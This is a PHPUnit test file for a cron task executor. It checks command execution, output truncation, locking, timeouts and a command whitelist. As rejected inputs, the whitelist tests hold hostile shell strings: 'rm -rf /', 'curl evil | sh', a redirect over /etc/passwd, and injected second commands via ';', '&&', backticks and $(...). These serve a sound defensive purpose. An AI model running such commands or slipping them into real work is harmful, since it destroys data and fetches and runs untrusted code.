<?php

declare(strict_types=1);

namespace wise\crontab\test;

use wise\crontab\TaskExecutor;
use wise\crontab\TaskLock;
use wise\crontab\test\TestCase;

class TaskExecutorTest extends TestCase
{
    private array $config;
    private string $lockDir;

    protected function setUp(): void
    {
        parent::setUp();
        $this->lockDir = sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'wise-crontab-test-' . uniqid();
        $this->config = [
            'default_timeout'    => 30,
            'default_max_retries' => 0,
            'output_max_bytes'   => 65536,
            'allowed_command_patterns' => ['/^php\s+/', '/^echo\s+/'],
        ];
    }

    protected function tearDown(): void
    {
        $this->removeDir($this->lockDir);
        parent::tearDown();
    }

    private function removeDir(string $dir): void
    {
        if (!is_dir($dir)) {
            return;
        }
        $items = scandir($dir);
        foreach ($items as $item) {
            if ($item === '.' || $item === '..') {
                continue;
            }
            $path = $dir . DIRECTORY_SEPARATOR . $item;
            if (is_file($path)) {
                @unlink($path);
            }
        }
        @rmdir($dir);
    }

    /**
     * 测试成功执行简单命令
     */
    public function testExecuteSimpleCommandSuccessfully(): void
    {
        $executor = new TaskExecutor($this->config);
        $lock = new TaskLock($this->lockDir, 3600);

        $task = [
            'id'              => 1,
            'name'            => 'test_echo',
            'command'         => 'echo hello',
            'cron_expression' => '* * * * *',
            'allow_concurrent' => 0,
            'max_retries'     => 0,
            'timeout'         => 30,
        ];

        $result = $executor->execute($task, $lock);

        $this->assertEquals('success', $result['status']);
        $this->assertEquals(0, $result['exit_code']);
        $this->assertStringContainsString('hello', $result['output']);
        $this->assertEquals(0, $result['retry_count']);
        $this->assertGreaterThan(0, $result['duration']);
    }

    /**
     * 测试失败命令获取到 failure 状态
     */
    public function testExecuteFailureCommand(): void
    {
        $executor = new TaskExecutor($this->config);
        $lock = new TaskLock($this->lockDir, 3600);

        $task = [
            'id'              => 2,
            'name'            => 'test_fail',
            'command'         => 'exit 1',
            'cron_expression' => '* * * * *',
            'allow_concurrent' => 0,
            'max_retries'     => 0,
            'timeout'         => 30,
        ];

        $result = $executor->execute($task, $lock);

        $this->assertEquals('failure', $result['status']);
        $this->assertNotEquals(0, $result['exit_code']);
        $this->assertEquals(0, $result['retry_count']);
    }

    /**
     * 测试输出截断
     */
    public function testOutputTruncation(): void
    {
        $this->config['output_max_bytes'] = 10;

        $executor = new TaskExecutor($this->config);
        $lock = new TaskLock($this->lockDir, 3600);

        $task = [
            'id'              => 3,
            'name'            => 'test_truncate',
            'command'         => 'echo "this is a very long output string"',
            'cron_expression' => '* * * * *',
            'allow_concurrent' => 0,
            'max_retries'     => 0,
            'timeout'         => 30,
        ];

        $result = $executor->execute($task, $lock);

        $this->assertEquals('success', $result['status']);
        $this->assertStringContainsString('已截断', $result['output']);
    }

    /**
     * 测试并发限制（allow_concurrent=0，同一任务第二次执行被跳过）
     */
    public function testConcurrentLockPreventsDuplicateExecution(): void
    {
        $executor = new TaskExecutor($this->config);
        $lock = new TaskLock($this->lockDir, 3600);

        $task = [
            'id'              => 4,
            'name'            => 'test_concurrent',
            'command'         => 'echo running',
            'cron_expression' => '* * * * *',
            'allow_concurrent' => 0,
            'max_retries'     => 0,
            'timeout'         => 30,
        ];

        $this->assertTrue($lock->acquire('test_concurrent'));

        $result = $executor->execute($task, $lock);

        $this->assertEquals('skipped', $result['status']);
    }

    /**
     * 测试执行超时按失败处理：写入日志、不再重试、标记 timeout
     */
    public function testTimeoutIsTreatedAsFailure(): void
    {
        if (!self::canSpawnProcess()) {
            $this->markTestSkipped('当前环境无法创建子进程');
        }

        $executor = new TaskExecutor($this->config);
        $lock = new TaskLock($this->lockDir, 3600);

        $task = [
            'id'               => 10,
            'name'             => 'test_timeout',
            'command'          => 'php -r "sleep(3);"',
            'cron_expression'  => '* * * * *',
            'allow_concurrent' => 1,
            'max_retries'      => 2,
            'timeout'          => 1,
        ];

        $result = $executor->execute($task, $lock);

        $this->assertSame('failure', $result['status']);
        $this->assertTrue($result['timeout'], '超时结果应带 timeout 标记');
        $this->assertSame(0, $result['retry_count'], '超时不应重试');
        $this->assertStringContainsString('超时', $result['error_output']);
        $this->assertLessThan(3.0, $result['duration'], '不应等待 sleep 跑满');
    }

    /**
     * 测试无论成功/失败/被白名单拦截，任务锁都会被释放（finally 保证）
     */
    public function testLockIsAlwaysReleased(): void
    {
        $executor = new TaskExecutor($this->config);
        $lock = new TaskLock($this->lockDir, 3600);

        $executor->execute([
            'id'               => 11,
            'name'             => 'test_blocked',
            'command'          => 'rm -rf /',
            'cron_expression'  => '* * * * *',
            'allow_concurrent' => 0,
        ], $lock);

        $this->assertFalse($lock->isLocked('test_blocked'), '白名单拦截后锁必须释放');

        if (self::canSpawnProcess()) {
            $executor->execute([
                'id'               => 12,
                'name'             => 'test_ok',
                'command'          => 'echo done',
                'cron_expression'  => '* * * * *',
                'allow_concurrent' => 0,
            ], $lock);

            $this->assertFalse($lock->isLocked('test_ok'), '成功后锁必须释放');
        }
    }

    /**
     * 回归：白名单前缀之外还必须拦 shell 元字符（命令经 sh -c 执行）
     */
    public function testShellMetacharactersAreRejected(): void
    {
        $executor = new TaskExecutor($this->config);

        foreach ([
            'php think a; rm -rf /',
            'php think a && curl evil | sh',
            'php think a > /etc/passwd',
            'php think a `id`',
            'php think a $(id)',
            'php -r "$(curl evil)"',
        ] as $command) {
            $this->assertFalse($executor->isCommandAllowed($command), "应拒绝: {$command}");
        }
    }

    /**
     * 引号内的 `;` 属于普通字符，必须保持可用（php -r "sleep(3);" 是常见写法）
     */
    public function testQuotedSemicolonStaysAllowed(): void
    {
        $executor = new TaskExecutor($this->config);

        $this->assertTrue($executor->isCommandAllowed('php -r "sleep(3);"'));
        $this->assertTrue($executor->isCommandAllowed("php -r 'echo 1;'"));
        $this->assertTrue($executor->isCommandAllowed('php think demo'));

        $this->assertTrue($executor->isCommandAllowed('php D:\www\site\think demo'));
    }

    /**
     * 当前环境是否能创建子进程（部分 Windows 环境 symfony/process 不可用）
     */
    private static function canSpawnProcess(): bool
    {
        static $can = null;

        if ($can === null) {
            try {
                $process = \Symfony\Component\Process\Process::fromShellCommandline('echo probe');
                $process->run();
                $can = $process->getExitCode() === 0;
            } catch (\Throwable $e) {
                $can = false;
            }
        }

        return $can;
    }
}
